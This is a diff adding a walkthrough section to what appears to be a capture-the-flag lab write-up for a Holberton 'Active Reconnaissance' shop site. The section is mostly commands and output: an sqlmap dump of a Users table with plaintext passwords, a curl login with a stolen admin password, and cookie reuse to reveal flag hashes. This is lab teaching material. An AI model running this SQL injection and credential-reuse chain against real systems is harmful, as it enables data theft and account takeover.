@@ -310,3 +310,98 @@ echo "4" > 4-tables.txt
 ```
 
 Verify result.
+
+
+## Second Flag: 101-flag.txt
+
+```bash
+# dump the Users table
+sqlmap -u "http://active.hbtn/product/1" -D "active.hbtn" -T Users --dump --batch --fresh-queries
+# Database: active.hbtn
+# Table: Users
+# [3 entries]
+# +----+--------------------+---------------------+----------+
+# | id | email              | password            | username |
+# +----+--------------------+---------------------+----------+
+# | 1  | yosri@active.hbtn  | 123456789@TJ6OKTXV  | yosri    |
+# | 2  | maroua@active.hbtn | admin123@TJ6OKTXV   | maroua   |
+# | 3  | abdou@active.hbtn  | abdouabdou@TJ6OKTXV | abdou    |
+# +----+--------------------+---------------------+----------+
+
+
+# try to login to the site with an adminpassword and store the cookie in cookie.txt
+curl -i -s -c cookies.txt   -X POST http://active.hbtn/login   -d "username=maroua&password=admin123@TJ6OKTXV"
+# HTTP/1.1 302 FOUND
+# Server: nginx/1.18.0
+# Date: Mon, 15 Jun 2026 22:02:53 GMT
+# Content-Type: text/html; charset=utf-8
+# Content-Length: 201
+# Connection: keep-alive
+# Location: /orders
+# Vary: Cookie
+# Set-Cookie: session=UF6Ah4V4VjIp7vMFQpN_UdFLaLqS55P120iZLG0JQb0; Expires=Thu, 16 Jul 2026 22:02:53 GMT; HttpOnly; Path=/
+# 
+# <!doctype html>
+# <html lang=en>
+# <title>Redirecting...</title>
+# <h1>Redirecting...</h1>
+# <p>You should be redirected automatically to the target URL: <a href="/orders">/orders</a>. If not, click the link.
+
+
+# now let's have a look on the /orders page reusing the stored cookie in cookies.txt
+curl -s -b cookies.txt http://active.hbtn/orders
+# <!-- Proudly Written by Yosri -->
+# <!DOCTYPE html>
+# <html>
+# 
+# <head>
+#     <meta charset="utf-8" />
+#     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+#     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+#     <meta name="description" content="Shop - Active Reconnaissance" />
+#     <meta name="author" content="Yosri.me" />
+#     <title>Shop - Active Reconnaissance</title>
+#     <link href="/static/css/style.css" rel="stylesheet" />
+#     <link href="/static/css/all.css" rel="stylesheet" />
+#     
+#     <link href="/static/css/products.css" rel="stylesheet" />
+#     <link href="/static/css/home.css" rel="stylesheet" />
+# 
+# </head>
+# 
+# <body>
+#     <header>
+#         <img src="/static/images/Logo.png" />
+#         <ul>
+#             <li><a href="/"><i class="fa-solid fa-house"></i>&nbsp;&nbsp;&nbsp;Home</a></li>
+#             <li><a href="/products">Products</a></li>
+#             <li><a href="/orders">Orders</a></li>
+#             <li><a href="/contact">Contact Us</a></li>
+#             
+#                 <li><a href="/login"><i class="fa-solid fa-user"></i>&nbsp;&nbsp;&nbsp; maroua</a></li>
+#             
+#             
+#         </ul>
+#     </header>
+# 
+#     <main>
+#     
+# <div class="home">
+#         <h1 style="color: black;">Holberton Sec Lab - 9e2150471de4c6b6d70c24a3b9d782de</h1>
+# </div>
+# 
+# 
+# 
+#     </main>
+# 
+#     <footer>
+#         Copyright &copy; 2023 Holberton School Inc, All rights reserved.
+#     </footer>
+#     
+#     <!-- Dont forget to delete this comment please
+           Holberton Sec Lab - f39ee8f104e2222c280206a72874f43d -->
+#     
+# </body>
+# </html>
+
+
